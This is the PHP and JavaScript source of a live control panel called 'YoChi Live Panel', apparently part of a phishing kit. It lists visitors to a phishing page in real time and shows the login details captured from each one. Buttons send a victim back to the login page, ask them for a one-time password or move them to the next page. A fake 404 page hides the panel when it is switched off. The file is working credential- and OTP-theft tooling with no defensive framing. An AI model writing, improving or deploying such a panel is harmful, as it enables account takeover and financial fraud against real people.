<?php 
session_start();
$yochadminpage=1;
include '../btm.php';
include '../settings.php';
if ($adminpanel != 1){
	header('HTTP/1.0 404 Not Found');die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
				<html>
					<meta name="viewport" content="width=device-width, initial-scale=1.0">
					<head>
						<title>404 Not Found</title>
						</head>
					<body>
						<h1>Not Found</h1>
						<p>The requested URL was not found on this server.</p>
					</body>
				</html>');exit();};$head='YoChi Live Panel';
$pgctnt = '';
if(isset($_SESSION['ston'])){
	if($_SESSION['ston']==$adminpass){$control='goodpass';$_SESSION['ston']=$adminpass;

	$ud=file_get_contents('db.json');
	$udarray = json_decode($ud);
	if($udarray->live == 'off'){header('location:./?');exit();};
	if($udarray->live == 'on'){$lp = 'green';} else{$lp = 'red';};
	$pgctnt = '
<div class="dist">
<div style="font-size:18px;text-align:left;color:'.$lp.';">
OTP LIVE LOOP : 
<form method="post" action="proc" style="display:inline"><label class="switch"><input class="'.$udarray->live.'" type="submit" name="toggleloop" type="submit" value="live"><span class="slider round"></span></label></form><a href="./?" class="stat btn">Go to Admin</a></div>
<div class="stathd">Waiting Line</div>
<span class="stat"><span class="count" id="totalv">0</span><br/><span class="desc">Waiting Visitors</span></span>
<div class="update"></div></div>
<div class="dist log"><div class="stathd">Visitor Info Preview</div>
<div class="console"></div></div>
<script>setInterval(function(){getjson("prl");},1000);</script>';}
	else{header('location:./?');exit();};
;}
else{header('location:./?');exit();};
?>
<!DOCTYPE html>
<html>
<head>
<meta name='viewport' content='width=device-width,initial-scale=1.0'/>
<title>YoCHI Live Panel</title>
<style>
*{padding:5px;box-sizing:border-box;}
html,body{margin:0;padding:0;font-family:verdana;font-size:15px;color:#fff;background-color:#333;}
body > div{margin:30px;}
.header{text-align:center;background-color:#262626;margin:0;padding:20px}
.stathd{padding:10px 10px;font-size:20px;}
.stat{display:inline-block;height:70px;background-color:#262626;margin:5px;border-radius:5px;text-align:center;}
.stat.btn{display:inline-block;width:auto;height:auto;line-height:20px;padding:10px;color:#fff;text-decoration:none;}
.stat .desc{}
.stat .count{font-size:30px;}
.red{background-color:#800000;}
.green{background-color:#006600;}
.blue{background-color:#000066;}
form{width:100%;max-width:450px;margin:100px auto;padding:20px;}
input{width:100%;height:40px;;font-size:13px;}
input[type=submit]{width:100%;height:40px;background-color:#ddd;font-size:13px;border:none;padding:5px 10px;color:#000;}
.console{text-align:left;border-radius:5px;background-color:#8c8c8c;color:#060;width:90%;height:220px;margin:auto;overflow-y:auto;}
@media only screen and (min-width:720px){
	.dist{float:left;width:60%;}
	.dist.log{width:40%;}
	.console{width:100%;height:480px;margin:auto;overflow-y:auto;}
}
.switch {
  position: relative;
  display: inline-block;
  width: 60px;
  height: 34px;
}

/* Hide default HTML checkbox */
.switch input {
  opacity: 0;
  width: 0;
  height: 0;
}

/* The slider */
.slider {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #ccc;
  -webkit-transition: .4s;
  transition: .4s;
}

.slider:before {
  position: absolute;
  content: "";
  height: 26px;
  width: 26px;
  left: 4px;
  bottom: 4px;
  background-color: white;
  -webkit-transition: .4s;
  transition: .4s;
}

input.on + .slider {
  background-color: green;
}

input:focus + .slider {
  box-shadow: 0 0 1px green;
}

input.on + .slider:before {
  -webkit-transform: translateX(26px);
  -ms-transform: translateX(26px);
  transform: translateX(26px);
}

/* Rounded sliders */
.slider.round {
  border-radius: 34px;
}

.slider.round:before {
  border-radius: 50%;
}

.liveblink{
  display: flex;
  flex-wrap: wrap;
  justify-content: flex-start;
  align-items: center;
  align-content: space-between;
  background-color:#1a793a;
  margin-bottom:3px;
  padding:2px 10px;
  animation: live 1s infinite;
  position:relative;
  }
.liveblink button{color:#fff;background-color:#262626;border-radius:12px;border:0;margin-left:10px;padding:5px 10px;}
.liveblink button:hover{background-color:#444;}
.liveblink button:click{background-color:#444;}
.liveblink button:focus{background-color:#15ca2d;}
.liveblink span.buttons{flex-grow: 2;text-align:right;}

@keyframes live {
  0% {background-color: #bbca25;}
  100% {background-color: #1a793a;}
}

@media (max-width:600px){
	.update{max-height:200px;overflow-y:scroll;}
	.liveblink span.buttons{text-align:center;}
	body > div{margin:0;}
	
}
span[blinkstat]{padding:0;}
</style>
</head>
<body>
<h1 class='header'>
<?php echo $head; ?>
</h1>
<div style='clear:both;display:<?php if($control=='goodpass'){echo 'block';} else{echo 'none';}?>'>
<?php echo $pgctnt; ?>
</div>
<script>

var datatable = {};

async function getjson(file) {
  let x = await fetch(file);
  let y = await x.text();
  let data = await JSON.parse(y);
  await parsereq(data);
  }
  
function parsereq(json){
	var notification = json;
	var totalvisits = 0;
	var el = document.querySelector('.update');
	for(let rid in notification){
		var sid = "client_0"+rid;
		if(document.querySelector('#'+sid) == null){
			session = document.createElement("div");
			session.className = "liveblink";session.id = sid;session.innerHTML = "<span>"+sid.replace("_0", " ").toUpperCase()+" <span blinkstat='curr'>waiting on loading</span> page...</span><span class='buttons'><button fid='back'>back&nbsp;to&nbsp;login</button><button fid='load'>ask&nbsp;otp</button><button fid='view' message='"+notification[rid]["msg"]+"'>view infos</button><button fid='next'>next&nbsp;page</button></span>";
			el.appendChild(session);
			for(let elch of document.querySelector('#'+sid).querySelector('.buttons').children){elch.addEventListener('click',procession);};
		} 
		else{
			document.querySelector('#'+sid).querySelector('button[fid="view"]').setAttribute('message',notification[rid]["msg"]);
			if(notification[rid]["step"]=="0"){document.querySelector('#'+sid).querySelector('span[blinkstat="curr"]').innerHTML="back to login";}
			else if(notification[rid]["step"]=="2"){document.querySelector('#'+sid).querySelector('span[blinkstat="curr"]').innerHTML="now on OTP";}
			else if(notification[rid]["step"]=="4"){document.querySelector('#'+sid).querySelector('span[blinkstat="curr"]').innerHTML="waiting on loading";};
		};	
		totalvisits=totalvisits+1;
	};
	for(let elch of el.children){
		var elchid = elch.id.replace("client_0", "");
		if(notification[elchid] == null){elch.remove();totalvisits=totalvisits-1;};
	};
	document.querySelector('#totalv').innerHTML=totalvisits;
	if(totalvisits > 0){document.querySelector('title').innerHTML='('+totalvisits+') YoCHI Live Panel';} else if(totalvisits == 0){document.querySelector('title').innerHTML='YoCHI Live Panel';};
};

function procession(){var e = event.target;var par = event.target.parentNode.parentNode.id.replace("client_0", "");var funcid = e.getAttribute('fid');
	if(funcid=="view"){document.querySelector('.console').innerHTML=decodeURIComponent(escape(atob(e.getAttribute('message')))).replaceAll("{br}", "<br>");}
	else if(funcid=="next"){submitupdate(par,1);}
	else if(funcid=="load"){submitupdate(par,2);}
	else if(funcid=="back"){submitupdate(par,0);};
}


function submitupdate(clid,prop) {
var http = new XMLHttpRequest();
http.open('POST',"prl", true);
http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
var params = "update="+clid+"&property="+prop+"&admin=true";
http.send(params);
http.onload=function(){var res=http.responseText;if(res==1){} else if(res==2){;} else{};};
};

</script>
</body>
</html>